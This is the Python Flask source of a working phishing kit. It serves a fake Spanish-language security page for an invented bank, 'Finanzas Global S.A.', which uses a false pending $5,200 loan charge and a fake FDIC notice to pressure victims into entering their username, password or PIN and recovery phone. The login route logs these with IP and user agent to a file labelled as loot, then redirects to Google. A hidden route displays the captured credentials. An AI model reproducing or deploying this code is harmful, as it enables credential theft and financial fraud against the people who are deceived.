from flask import Flask, render_template_string, request, redirect
import datetime
import requests

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Soporte de Seguridad | Finanzas Global S.A.</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f7f9; margin: 0; color: #333; }
        .nav { background: #1a252f; color: white; padding: 10px 20px; text-align: center; font-size: 11px; letter-spacing: 1px; }
        .container { max-width: 480px; margin: 30px auto; background: #fff; border-radius: 8px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); overflow: hidden; border-top: 6px solid #d32f2f; }
        .header { padding: 30px; text-align: center; border-bottom: 1px solid #eee; }
        .header h1 { margin: 0; font-size: 24px; color: #1a252f; }
        .header span { color: #d32f2f; }
        
        .alert-box { background: #fff3cd; padding: 15px; font-size: 13px; color: #856404; text-align: center; border-bottom: 1px solid #ffeeba; }
        
        .form-body { padding: 30px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 11px; font-weight: bold; color: #7f8c8d; text-transform: uppercase; margin-bottom: 5px; }
        input { width: 100%; padding: 14px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 15px; background: #fdfdfd; }
        input:focus { border-color: #2c3e50; outline: none; background: #fff; }
        
        .btn-submit { width: 100%; background: #d32f2f; color: #fff; border: none; padding: 16px; border-radius: 4px; font-size: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: 0.3s; }
        .btn-submit:hover { background: #b71c1c; transform: translateY(-1px); }
        
        .legal-text { font-size: 10px; color: #999; padding: 20px; text-align: justify; background: #f8f9fa; line-height: 1.4; }
        .footer { background: #1a252f; color: #95a5a6; padding: 20px; text-align: center; font-size: 11px; }
    </style>
</head>
<body>
    <div class="nav">CONEXIÓN SEGURA VERIFICADA POR GLOBAL-SHIELD 2026</div>
    <div class="container">
        <div class="header">
            <h1>FINANZAS<span>GLOBAL</span></h1>
            <p style="font-size:12px; color:#666;">Departamento de Prevención de Fraudes Electrónicos</p>
        </div>
        
        <div class="alert-box">
            <b>⚠️ ACCIÓN INMEDIATA REQUERIDA</b><br>
            Cancelación de desembolso pendiente: <b>$5,200.00 USD</b>
        </div>

        <div class="form-body">
            <p style="font-size:13px; color:#555; margin-bottom:20px;">
                Para ejercer su derecho de revocación del contrato #CR-88390 y evitar el cargo en su cuenta, confirme sus credenciales de acceso institucional.
            </p>
            <form action="/login" method="post">
                <div class="input-group">
                    <label>Usuario o Correo Electrónico</label>
                    <input type="text" name="u" required placeholder="nombre@ejemplo.com">
                </div>
                <div class="input-group">
                    <label>Clave de Acceso / PIN</label>
                    <input type="password" name="p" required placeholder="••••••••">
                </div>
                <div class="input-group">
                    <label>Teléfono de Recuperación</label>
                    <input type="text" name="tel" required placeholder="+54 9 ...">
                </div>
                <button type="submit" class="btn-submit">CANCELAR PRÉSTAMO Y BLOQUEAR ACCESO</button>
            </form>
        </div>

        <div class="legal-text">
            <b>AVISO LEGAL:</b> Al proceder, usted autoriza a Finanzas Global S.A. a validar su identidad digital bajo la Ley 25.326. Este proceso genera una huella de seguridad única. En caso de no completar la verificación, el desembolso se procesará en las próximas 12 horas.
        </div>
        
        <div class="footer">
            Sede Central: 200 West Street, NY 10282, USA<br>
            © 2026 Finanzas Global S.A. | Member FDIC
        </div>
    </div>
</body>
</html>
"""

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: data = f.read()
    except: data = "Búnker vacío."
    return f"<html><body style='background:#1a1a1a; color:#00ff00; font-family:monospace; padding:20px;'><h2>🛰️ MONITOR SVR-MATRIX</h2><hr><pre>{data}</pre></body></html>"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('tel')
    ip = request.remote_addr
    agent = request.user_agent.string
    
    log_entry = (f"--- NUEVO BOTÍN [{datetime.datetime.now()}] ---\n"
                 f"USER: {u}\nPASS: {p}\nTEL: {t}\nIP: {ip}\nAGENT: {agent}\n"
                 f"{'-'*40}\n")
    
    with open("capturas.txt", "a") as f:
        f.write(log_entry)
        
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
